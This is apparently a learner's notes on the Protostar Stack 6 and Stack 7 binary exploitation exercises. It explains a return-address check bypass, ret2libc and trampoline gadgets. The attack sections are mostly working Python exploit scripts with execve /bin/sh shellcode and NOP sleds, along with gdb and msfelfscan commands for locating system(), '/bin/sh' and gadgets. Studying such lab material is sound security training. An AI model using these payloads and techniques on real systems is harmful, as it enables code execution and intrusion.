# LiveOverflow Binary Exploitation / Memory Corruption

### 0x0F - Ret2Libc attacks via Stack Six exercise

What you need to know beforehand...

1. __builtin_return_address(0) is a function from compilter, allows you to read current return address from the stack.

    - From analysing the assembly code, the sequence of this function should be as follows:

        ```
        0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
        0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
        0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
        ```

    - Most likely, the return address is at ebp, which is the base pointer, which also makes sense since the base pointer points at the bottom of the stack which is most likely where the return address will be

    - One instruction after executing gets() in getpath()

        ```
        (gdb) r
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack6 ""
        input path please: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
        
        Breakpoint 3, getpath () at stack6/stack6.c:15
        15	in stack6/stack6.c
        (gdb) x $ebp+0x4
        0xbffffccc:	0x42424242
        ```

2. Basically for this task, we cannot return to the stack due to the conditional which prevents any return address starting with `bf`. When we run `cat /proc/self/maps`, we observe that the stack address range starts with `bf`

    ```
    $ cat /proc/self/maps
    08048000-08052000 r-xp 00000000 00:10 1639       /bin/cat
    08052000-08053000 rw-p 0000a000 00:10 1639       /bin/cat
    08053000-08074000 rw-p 00000000 00:00 0          [heap]
    b7d21000-b7e96000 r--p 00000000 00:10 1694       /usr/lib/locale/locale-archive
    b7e96000-b7e97000 rw-p 00000000 00:00 0 
    b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so
    b7fd5000-b7fd6000 ---p 0013e000 00:10 759        /lib/libc-2.11.2.so
    b7fd6000-b7fd8000 r--p 0013e000 00:10 759        /lib/libc-2.11.2.so
    b7fd8000-b7fd9000 rw-p 00140000 00:10 759        /lib/libc-2.11.2.so
    b7fd9000-b7fdc000 rw-p 00000000 00:00 0 
    b7fe0000-b7fe2000 rw-p 00000000 00:00 0 
    b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]
    b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so
    b7ffe000-b7fff000 r--p 0001a000 00:10 741        /lib/ld-2.11.2.so
    b7fff000-b8000000 rw-p 0001b000 00:10 741        /lib/ld-2.11.2.so
    bffeb000-c0000000 rw-p 00000000 00:00 0          [stack]
    ```

3. RET instruction looks at the address at the top of the stack, pops it and jumps there (set eip to that value that got pop-ed, making it the MEMORY ADDRESS of the next instruction to execute)

### Answer for Stack 6 (using gdb/objdump)

1. To bypass the check, we can set the address of the return address after our padding then the rest of our original exploit (i.e. overwrite eip + nops + shellcode)

2. What happens here is that once our input passes the check, the program executes the first RET instruction which pops off the value at the top of the stack (the memory address that ESP is pointing to) and executes it. In this case, instead of popping off the memory address to redirect code execution to ESP which is where the rest of our shellcode is at, it will first pop off the return address of the getpath() function. Only then, will we proceed to redirect code execution

3. Basically, the important address which will cause our exploit to fail would ONLY be the one AFTER the padding, as that will be the address that will be stored in $eax and compared later on.

4. To get the address of the RET instruction, you can either use gdb or `objdump -S /binary`

Python code:

```
import struct
padding     = "0000" + "A" * 76 # add 4 more bytes to account for the unsigned int ret variable, ref https://docs.microsoft.com/en-us/cpp/cpp/data-type-ranges?view=msvc-170
eip         = "\xf0\xfc\xff\xbf"
bypass      = struct.pack("I", 0x080484f9)
eip         = struct.pack("I", 0xbffffcf0+30) # add 30 due to unreliability in stack
breakpoints = "\xCC" * 10
nopsled     = "\x90" * 100
exploit     = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    
print padding+bypass+eip+nopsled+exploit
```

### Answer for Stack 6 (using ret2libc)

Background information:

- W^X: Never have a memory section which is both writeable and executable (cause thats what buffer overflow does essentially)

- DEP/NX Bit: Are examples of memory protection scheme which prevents code execution

- Ret2libc is an example of an attack which can help bypass these restrictions

- How it works

1. Return to System() function

2. Use System() with "/bin/sh" argument to start a bash shell

- What do you need

1. Location of System()

    - `(gdb) p system`

2. Return address - can be anything, but most people use an exit function() to end the function properly

3. Location of "/bin/sh" 

    - `cat /proc/self/maps` to get starting address of /lib/libc-2.11.2.so library

    - `find 0xb7e97000, +9999999, "/bin/sh"` to find location of /bin/sh in memory (may not always work)

    - `strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"` to find the offset to from the starting address of the library to the address of /bin/sh

    - `x/s 0xb7e97000 + 0x11f3bf` to find location of /bin/sh in memory (more reliable)

Python code:

```
import struct
padding     = "0000" + "A" * 76
_system = struct.pack("I", 0xb7ecffb0)
_return = "AAAA" # return address after system call completed
_argument = struct.pack("I", 0xb7fb63bf)

print padding+_system+_return+_argument
```

### Stack7

### Answer (via objdump/gdb or ret2libc)

- Exactly the same as Stack6, just need to change return address if you are doing the hardcode method

    ```
    import struct
    padding     = "0000" + "A" * 76 # add 4 more bytes to account for the unsigned int ret variable, ref https://docs.microsoft.com/en-us/cpp/cpp/data-type-ranges?view=msvc-170
    eip         = "\xf0\xfc\xff\xbf"
    bypass      = struct.pack("I", 0x08048544)
    eip         = struct.pack("I", 0xbffffcf0+30) # add 30 due to unreliability in stack
    breakpoints = "\xCC" * 10
    nopsled     = "\x90" * 100
    exploit     = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    print padding+bypass+eip+nopsled+exploit
    ```

### Answer using msfelfscan

- Use msfelfscan to find jmp esp instruction (for our case it does not work)

    `msfelfscan -j esp -f BINARY` / `objdump -d BINARY | grep "ff e9"` (you can also use objdump with jmp esp's opcode ffe9)

- Use msfelfscan to find POP POP RET instruction, a popular ROP gadget

    `msfelfscan -s -f BINARY`

    ```
    import struct
    padding     = "0000" + "A" * 76 # add 4 more bytes to account for the unsigned int ret variable, ref https://docs.microsoft.com/en-us/cpp/cpp/data-type-ranges?view=msvc-170
    bypass      = struct.pack("I", 0x08048492)
    pop1        = "PPPP"
    pop2        = "QQQQ"
    eip         = struct.pack("I", 0xbffffcf0+30) # add 30 due to unreliability in stack
    breakpoints = "\xCC" * 10
    nopsled     = "\x90" * 100
    exploit     = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    print padding+bypass+pop1+pop2+eip+nopsled+exploit
    ```

- Use msfelfscan to find CALL EAX instruction (faced many issues with environment variables messing up exploit code. Using the nops method alone did not work...)

    `msfelfscan -j EAX` / `objdump -d BINARY | grep "ff d0"`

    ```
    import struct
    padding     = "0000" + "A" * 76
    bypass      = struct.pack("I", 0x08048492)
    nopsled1     = "\x90" * 8
    hotfix      = struct.pack("I", 0xbffffe3c)
    nopsled    = "\x90" * 50
    exploit     = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    
       
    print padding+bypass+nopsled1+hotfix+nopsled+exploit
    ```

    - bypass would be the `CALL EAX` instruction
    
    - When we observe the crash initially, we see that we get a memory access violation and eip is pointing to 0x90909090

    - Observing $esp and counting the number of 0x90 left in the stack, we know for a fact that the $eip will point to the address after 8 * "\x90".

- To ensure that our exploits works properly, we need to ensure that the execution environment is consistent

    1. For gdb

        ```
        env - gdb BINARY
        (gdb) unset env LINES
        (gdb) unset env COLUMNS
        ```
    
    2. For normal running

        ```
        env -i sh
        ```

### Additional Stuff:

- The address that we returned to in our first answer, is known as a gadget (part of ROPGadgets, learn more next time)

- [Resetting environment in gdb](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it)

- [Resetting environment in CLI](https://www.roguesecurity.in/2018/01/13/buffer-overflow-series-exploit-failing-outside-gdb/)

- [Explanation of what strdup() does to the eax register and using CALL EAX](https://secinject.wordpress.com/2017/07/08/protostar-stack7/)

- [Better explanation of using eax register and CALL EAX](https://failingsilently.wordpress.com/2017/08/01/exploit-exercises-protostar-stack7-trampolines/)
